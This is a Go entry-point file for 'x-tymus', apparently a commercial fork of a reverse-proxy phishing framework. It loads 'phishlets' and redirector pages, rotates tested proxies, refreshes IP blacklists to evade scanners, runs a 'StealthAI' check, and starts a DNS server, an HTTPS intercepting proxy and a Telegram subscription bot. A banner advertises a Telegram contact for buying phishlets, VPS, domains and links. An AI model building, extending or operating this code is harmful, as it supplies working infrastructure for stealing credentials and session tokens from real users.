package main

import (
	"flag"
	"fmt"
	_log "log"
	"os"
	"os/signal"
	"os/user"
	"path/filepath"
	"regexp"
	"syscall"
	"time"
	"bufio"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"golang.org/x/net/proxy"
	gotty "github.com/mattn/go-isatty"
	"github.com/caddyserver/certmagic"
	"github.com/x-tymus/x-tymus/core"
	"github.com/x-tymus/x-tymus/database"
	"github.com/x-tymus/x-tymus/log"
	"go.uber.org/zap"

	"github.com/fatih/color"
)

var phishlets_dir = flag.String("p", "", "Phishlets directory path")
var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
var debug_log = flag.Bool("debug", false, "Enable debug output")
var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
var cfg_dir = flag.String("c", "", "Configuration directory path")
var version_flag = flag.Bool("v", false, "Show version")

func isatty(f *os.File) bool {
	return gotty.IsTerminal(f.Fd())
}

func joinPath(base_path string, rel_path string) string {
	var ret string
	if filepath.IsAbs(rel_path) {
		ret = rel_path
	} else {
		ret = filepath.Join(base_path, rel_path)
	}
	return ret
}

func showAd() {
	lred := color.New(color.FgHiRed)
	lgreen := color.New(color.FgHiGreen)
	white := color.New(color.FgHiWhite)
	message := fmt.Sprintf("%s: %s %s", lred.Sprint("Contact"), lgreen.Sprint("https://t.me/x-tymus"), white.Sprint("(For order any phishlets/vps/domains/links...)"))
	log.Info("%s", message)
}

func testProxy(proxyURL string) bool {
 u, err := url.Parse(proxyURL)
 if err != nil {
  return false
 }
 var transport *http.Transport
 if u.Scheme == "socks5" {
  dialer, err := proxy.SOCKS5("tcp", u.Host, nil, proxy.Direct)
  if err != nil {
   return false
  }
  transport = &http.Transport{
   Dial: dialer.Dial,
  }
 } else {
  transport = &http.Transport{
   Proxy: http.ProxyURL(u),
  }
 }
 client := &http.Client{
  Timeout: 10 * time.Second,
  Transport: transport,
 }
 resp, err := client.Get("http://httpbin.org/ip")
 if err != nil {
  return false
 }
 defer resp.Body.Close()
 return resp.StatusCode == 200
}

func main() {
	flag.Parse()

	if *version_flag == true {
		log.Info("version: %s", core.VERSION)
		return
	}

	exe_path, _ := os.Executable()
	exe_dir := filepath.Dir(exe_path)

	core.Banner()
	showAd()

	_log.SetOutput(log.NullLogger().Writer())
	certmagic.Default.Logger = zap.NewNop()
	certmagic.DefaultACME.Logger = zap.NewNop()

	if *phishlets_dir == "" {
		*phishlets_dir = joinPath(exe_dir, "./phishlets")
		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
			*phishlets_dir = "/usr/share/x-tymus/phishlets/"
			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
				log.Fatal("you need to provide the path to directory where your phishlets are stored: ./x-tymus -p <phishlets_path>")
				return
			}
		}
	}
	if *redirectors_dir == "" {
		*redirectors_dir = joinPath(exe_dir, "./redirectors")
		if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
			*redirectors_dir = "/usr/share/x-tymus/redirectors/"
			if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
				*redirectors_dir = joinPath(exe_dir, "./redirectors")
			}
		}
	}
	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
		return
	}
	if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
		os.MkdirAll(*redirectors_dir, os.FileMode(0700))
	}

	log.DebugEnable(*debug_log)
	if *debug_log {
		log.Info("debug output enabled")
	}

	phishlets_path := *phishlets_dir
	log.Info("loading phishlets from: %s", phishlets_path)

	if *cfg_dir == "" {
		usr, err := user.Current()
		if err != nil {
			log.Fatal("%v", err)
			return
		}
		*cfg_dir = filepath.Join(usr.HomeDir, ".x-tymus")
	}

	config_path := *cfg_dir
	log.Info("loading configuration from: %s", config_path)

	err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
	if err != nil {
		log.Fatal("%v", err)
		return
	}

	crt_path := joinPath(*cfg_dir, "./crt")

	cfg, err := core.NewConfig(*cfg_dir, "")
	if err != nil {
		log.Fatal("config: %v", err)
		return
	}
	cfg.SetRedirectorsDir(*redirectors_dir)

	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
	if err != nil {
		log.Fatal("database: %v", err)
		return
	}

	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
	if err != nil {
		log.Error("blacklist: %s", err)
		return
	}
	// expose global blacklist for runtime updates
	core.GlobalBlacklist = bl
	// expose global config for other packages
	core.GlobalConfig = cfg

	// If feed URLs are configured, schedule periodic updates
	if cfg != nil && len(cfg.GetBlacklistFeedURLs()) > 0 {
		interval := cfg.GetBlacklistFeedInterval()
		if interval <= 0 {
			interval = 3600 // default to 1h
		}
		go func() {
			// run initial update immediately
			added, err := core.UpdateBlacklistFromFeeds(cfg.GetBlacklistFeedURLs(), 15*time.Second)
			if err != nil {
				log.Error("ipfeed: initial update failed: %v", err)
			} else {
				log.Info("ipfeed: initial update added %d ips", added)
			}
			ticker := time.NewTicker(time.Duration(interval) * time.Second)
			defer ticker.Stop()
			for range ticker.C {
				added, err := core.UpdateBlacklistFromFeeds(cfg.GetBlacklistFeedURLs(), 15*time.Second)
				if err != nil {
					log.Error("ipfeed: scheduled update failed: %v", err)
					continue
				}
				if added > 0 {
					log.Info("ipfeed: scheduled update added %d ips", added)
				}
			}
		}()
	}

	// Run StealthAI health check in background so it doesn't delay startup
	go core.StealthAIHealthCheck()

	files, err := os.ReadDir(phishlets_path)
	if err != nil {
		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
		return
	}
	for _, f := range files {
		if !f.IsDir() {
			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
			rpname := pr.FindStringSubmatch(f.Name())
			if rpname == nil || len(rpname) < 2 {
				continue
			}
			pname := rpname[1]
			if pname != "" {
				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), nil, cfg)
				if err != nil {
					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
					continue
				}
				cfg.AddPhishlet(pname, pl)
			}
		}
	}
	cfg.LoadSubPhishlets()
	cfg.CleanUp()
// Load and test proxies from proxylist.txt
proxyFile, err := os.Open("./core/proxylist.txt")
if err != nil {
    log.Error("failed to open proxylist.txt: %v", err)
} else {
    defer proxyFile.Close()
    scanner := bufio.NewScanner(proxyFile)
    goodCount := 0
    for scanner.Scan() {
        proxyURL := strings.TrimSpace(scanner.Text())
        if proxyURL == "" {
            continue
        }
        if testProxy(proxyURL) {
            // Parse and add to config
            u, err := url.Parse(proxyURL)
            if err != nil {
                log.Error("failed to parse proxy URL '%s': %v", proxyURL, err)
                continue
            }
            host, portStr, err := net.SplitHostPort(u.Host)
            if err != nil {
                log.Error("failed to parse host:port in '%s': %v", proxyURL, err)
                continue
            }
            port, err := strconv.Atoi(portStr)
            if err != nil {
                log.Error("invalid port in '%s': %v", proxyURL, err)
                continue
            }
            username := u.User.Username()
            password, _ := u.User.Password()
            cfg.AddProxy(u.Scheme, host, port, username, password)
            fmt.Printf("\033[32m%s\033[0m\n", proxyURL) // Show in green as good
            goodCount++
        } else {
            fmt.Printf("\033[31m%s\033[0m\n", proxyURL) // Show in red as bad
        }
    }
    if err := scanner.Err(); err != nil {
        log.Error("error reading proxylist.txt: %v", err)
    }
    if goodCount > 0 {
        cfg.EnableProxy(true)
        log.Info("%d proxies loaded and in use", goodCount)
    } else {
        cfg.EnableProxy(false)
        log.Info("no proxies available")
    }
}

	ns, _ := core.NewNameserver(cfg)
	go ns.Start()

	crt_db, err := core.NewCertDb(crt_path, cfg, ns)
	if err != nil {
		log.Fatal("certdb: %v", err)
		return
	}
	cfg.CrtDb = crt_db

	hs, _ := core.NewHttpServer()
	hs.Cfg = cfg
	hs.Db = db
	go hs.Start()

	hp, err := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
	if err != nil {
		log.Fatal("http_proxy: %v", err)
		return
	}
	go hp.Start()

	// Start Telegram subscription bot if configured
	tbot, err := core.NewTelegramBot(cfg, db)
	if err != nil {
		log.Error("telegram bot: %v", err)
	} else if tbot != nil {
		core.GlobalBot = tbot
		go tbot.Start()
		log.Info("telegram bot: running")
	} else {
		log.Info("telegram bot: not configured (set bot_token + bot_admin_chat_id in config)")
	}

	// If running without a TTY (e.g. systemd service), skip the interactive
	// terminal and block forever so all goroutines (proxy, bot, certs) stay alive.
	if !isatty(os.Stdin) {
		log.Info("no TTY detected — running in daemon mode (bot + proxy active)")
		sig := make(chan os.Signal, 1)
		signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
		<-sig
		log.Info("shutting down")
		if tbot != nil {
			tbot.Stop()
		}
		return
	}

	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
	if err != nil {
		log.Fatal("%v", err)
		return
	}
	t.DoWork()
}
